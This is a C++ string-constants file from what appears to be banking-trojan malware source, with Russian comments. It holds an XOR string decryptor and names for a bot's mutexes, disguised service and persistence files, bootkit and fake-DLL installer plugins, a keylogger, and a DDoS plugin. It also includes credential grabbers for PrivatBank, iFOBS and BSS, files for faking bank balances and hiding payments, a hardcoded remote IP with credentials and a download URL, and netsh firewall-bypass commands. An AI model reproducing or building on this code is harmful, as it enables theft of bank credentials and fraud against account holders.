//---------------------------------------------------------------------------

#pragma hdrstop

#include "StrConsts.h"
#include "Config.h"
#include "Crypt.h"
#include "Crypt.h"

#include "Modules.h"

//---------------------------------------------------------------------------


extern CSSTR BeginCryptBlock[];
extern CSSTR EndCryptBlock[];



//*****************************************************
// GetStr - Функция расшифровывает строку EncryptedStr
//*****************************************************
string GetStr(const char* EncryptedStr)
{
	string Result;

	bool Encrypted = (EncryptedStr > BeginCryptBlock) && (EncryptedStr < EndCryptBlock) && 
     				 (BeginCryptBlock[0] != 'C');

	if (Encrypted)
		Result = XORCrypt::DecodeString(GetSessionPassword(), EncryptedStr);
	else
		Result = EncryptedStr;

	return Result;
}
//-----------------------------------------------------------------------------



//==================================================//
CSSTR BeginCryptBlock[] = ENCRYPTED_STRINGS_BEGIN;  //
//=============================================================================
//  Блок хранения шифрованных строк.
//  Все строки находящиеся ниже и до определения
//  CSEND
//  будут шифроваться билдером
//=============================================================================


CSSTR StrBotGlobalMutexName[] = "GSA28593KFE7"; // Префикс глобального мьютекса сигнализирующего, что бот запущен
CSSTR StrBootkitIsRunMutex[] = "BIR737JK3LJ"; //мьютекс сигнализирующий, что запущен бот из под буткита


// Оригинальное имя ехе файла бота
CSSTR EStrOriginalBotExeName[] = "WinHelp";
CSSTR EStrBotStartupLinkName[] = "wslneo.lnk";  // Имя ярлыка в автозагрузке


// Имя файла для хранения хостов бота
CSSTR EStrHostsFileName[] = "mnhslst32.dat";


// Поддирректория сервиса
CSSTR EStrBotServiceExePath[] = "com\\";

// Имя ехе файла сервиса бота
CSSTR EStrBotServiceExeName[] = "svchost.exe";


// Имя сервиса
CSSTR EStrServiceName[] = "Windows NAT";


// Рабочии директории и файлы
CSSTR StrBotWorkPath[] = "WnsBMT"; // Рабочий каталог бота
CSSTR StrGrabberPath[] = "gdata";  // Имя рабочей папки грабера

CSSTR EStrConfigFileName[]   = "igfxtray.dat"; // Имя файла хранения конфига
CSSTR EStrConfigHPFileName[] = "igfxtrayhp.dat"; // Имя файла хранения конфига повышенного приоритета


// Имена служебный пайпов
CSSTR EStrPipeLoader[] = "ldrspp"; // Имя служебного пайпа лоадера



// Служебные команды, передаваемые через пайпы процессам
CSSTR EStrProcessCommandDeleteBot[] = "delbt";  // Команда на удаление exe бота

// Имена служебных фалов
CSSTR EStrPrefixFileName[] = "mnprsdd.dat"; // Файл хранения префикса
CSSTR EStrTemporaryPrefixFileName[] = "mnprsdd.tmp"; // Временный Файл хранения префикса


// Имя плагина бота в виде длл
CSSTR EStrBotPlug[] = "bot.plug";

// Имф инсталтора буткита
CSSTR EStrBootkitInstaller[] = "bki.plug";


//Имя систем граберов
CSSTR EStrSystemPrivat[] = "privat"; // Грабер ключей приватбанка
#ifdef IfobsOnlineH
CSSTR EStrSystemIfobsOnline[] = "IfobsOnline"; // Грабер системы Ifobs онлайн
#endif



CSSTR EStrCabNameDisketa[] = "disketa"; // Имя каба для отправки флопидисков

// имя сигнального файла бесконечного кейлогера
CSSTR EStrInfiniteKeyLoggerSignal[] = "iks.dat";



// Имя инсталятора фэкедлл
CSSTR EStrFakeDllInstaller[] = "fdi.plug";
// Имя файла по которому определяем, что установлена фейкдлл (файл в папке бота)
CSSTR EStrFakeDllFlag[] = "fdi.txt";
//имя файла по которому определяем, что установлена фейкдлл в клиенте ифобс
CSSTR EStrFakeDllIFobsFlag[] = "ifobsfdi.txt";
//имя файла по которому определяем, что установлена фейкдлл в клиенте cbank
CSSTR EStrFakeDllCBankFlag[] = "cbankfdi.txt";


// Перечень команд, которые может выполняь бот
CSSTR EStrCommandInstallFakeDLL[] = "installfd";  // Команда на инсталяцию фэкедлл
CSSTR EStrCommandInstallBootkit[] = "installbk";  // Команда на инсталяцию буткита


// Имена файлов, для добавления в лог
CSSTR StrLogFileScreenShot[]  = "Screen.png";
CSSTR StrLogFileTextData[]    = "Log.txt";
CSSTR StrLogFileNetInfo[]     = "NetInfo.txt";
CSSTR EStrLogKeyPath[]        = "Keys";


// Имяена полей лога
CSSTR EStrLogFieldLogin[]       = "Login";
CSSTR EStrLogFieldPassword[]    = "Password";
CSSTR EStrLogFieldKeyPassword[] = "KeyPassword";
CSSTR EStrLogFieldURL[]         = "URL";




// Имена функций библиотеки видеозаписи.
CSSTR VideoRecFuncInit[]			= "Init";
CSSTR VideoRecFuncRelease[]			= "Release";
CSSTR VideoRecUpdateSettings[]		= "UpdateSettings";
CSSTR VideoRecFuncAddIPServer[]		= "AddIPServer";
CSSTR VideoRecFuncRecordProcess[]	= "StartRecPid";
CSSTR VideoRecFuncRecordWnd[]		= "StartRecHwnd";
CSSTR VideoRecFuncStop[]			= "StopRec";
CSSTR VideoRecFuncResetTime[]		= "ResetTime";
CSSTR VideoRecFuncSendFiles[]		= "StartSend";
CSSTR VideoRecFuncSendFilesAsync[]	= "StartSendAsync";
CSSTR VideoRecFuncIsSendedAsync[]	= "IsSendedAsync";
CSSTR VideoRecFuncFolderIsUpload[]	= "FolderIsUpload";
CSSTR VideoRecFuncRunCmdExec[]		= "RunCmdExec";
CSSTR VideoRecFuncSendLog[]			= "SendLog";
CSSTR VideoRecPipe[]				= "VideoServer";
CSSTR VideoRecOutOfHibernation[]	= "OutOfHibernation";


CSSTR HTTPFormContentDisposition[] = "Content-Disposition: form-data; ";
CSSTR HTTPFormFieldName[]          = "name=\"%s\"";
CSSTR HTTPFormFileInfo[]           = "; filename=\"%s\"\r\nContent-Type: %s\r\nContent-Transfer-Encoding: binary";
CSSTR HTTPOctetStream[]            = "application/octet-stream";


CSSTR IFobsFlagCopy[] = "ifobscopy.txt";


// Строки модуля AzConfig
#ifdef AzConfigH
	CSSTR AzConfigParamUserName[] = "%az_user%";

	CSSTR EStrAzGrabberPathMask[] = "/raf/?uid=%s&sys=%s&cid=%s&mode=%s";
#endif


// Строки модуля BSS грабера
#ifdef BSSH
	CSSTR BSSLogTemplate[] = "Url: %s\r\n\r\n"
							 "Login:     %s\r\n"
							 "Password:  %s\r\n\r\n"
							 "UserAgent: %s\r\n";
#endif



#ifdef FakeDllInstallerH
	CSSTR EStrIBankRegistryPath[] = "SOFTWARE\\Classes\\Installer\\Products\\7B00DF09E169B5445AD2F176D624114\\";
	CSSTR EStrSberRegistryKey[]   = "SBRF\\";
	CSSTR EStrIBankFileName[]     = ".iBank2"; // Имя файли при обнаружении которого будет установлена Fake DLL
#endif


#ifdef ddosH
	// Имя плагина DDOS
	CSSTR EStrDDOSPlugin[] = "ddos.plug";

	// Имя файла данных для команды DDOS
	CSSTR EStrDDOSSignal[] = "ddos.sig";
#endif


#ifdef PrivatBankH
	// Имя системы грабера пароля ключа приватбанка
	CSSTR EStrPrivatBankGrabber[] = "privatbank";

	// Маска зпголовка окна ввода проля
	CSSTR EStrPrivatBankKeyPassWndMask[] = "Файл ключей*";
	CSSTR EStrPrivatBankKeyPassWndMask2[] = "Ключ*";

	// Маска определения адреса авторизации в приват24
	CSSTR EStrPrivatBankLoginMask[] = "https://cb.privatbank.ua/p24/news*";

	// логин и пароль приватбанка
	CSSTR EStrPrivatBankLogin[]    = "UserName";
	CSSTR EStrPrivatBankPassword[] = "UserPass";

#endif


CSSTR RDPRunParam[] = "88.198.53.14;22;445;sshu;P@ssw0rd;system_help;fixerESCONuendoZ;http://www.cushyhost.com/download.php?img=73";

#ifdef BBSCBankH
//для BSS CBank оффлайн
//имя файла хранящий что подменять
CSSTR CBankReplacement[] = "cbank_replacement.txt";
//флаг для запуска подмены (был создан файл подмены)
CSSTR CBankFlagUpdate[] = "cbank_flagupdate.txt"; 
//файл с данными о подмене
CSSTR CBankRestFixed[] = "cbank_restfixed.txt"; 
#endif //BBSCBankH

//для Tiny
#ifdef TinyH
CSSTR TinyReplacement[] = "tiny_replacement.txt"; //имя файла хранящий что подменять
CSSTR TinyFlagUpdate[] = "tiny_flagupdate.txt"; //флаг для запуска подмены (был создан файл подмены)
CSSTR TinyOldBalans[] = "tiny_oldbalans.dat"; //имя файла для хранения подменяемого баланса, для восстановления
CSSTR TinyOldDocs[] = "tiny_olddocs.dat"; //имя файла для хранения данных по скрываемым платежкам, для восстановления
#endif //TinyH


//команда для добавления в список доверенных браундмаузера
CSSTR NetshFirewallWinXp[] = "netsh firewall add allowedprogram \"%s\" %s ENABLE"; //для windows XP
CSSTR NetshFirewallWin7Add[] = "netsh advfirewall firewall add rule name=\"%s\" dir=in action=allow program=\"%s\""; //для windows 7
CSSTR NetshFirewallWin7Del[] = "netsh advfirewall firewall delete rule \"%s\"";
//=============================================================================
// Конец блока шифрованных строк
//=============================================================================
CSSTR EndCryptBlock[] = ENCRYPTED_STRINGS_END; //
//=============================================//





//-----------------------------------------------------------------------------
// Не шифрованные строки
//-----------------------------------------------------------------------------

CSSTR Slash[]   = "\\";
CSSTR SlashChar = '\\';
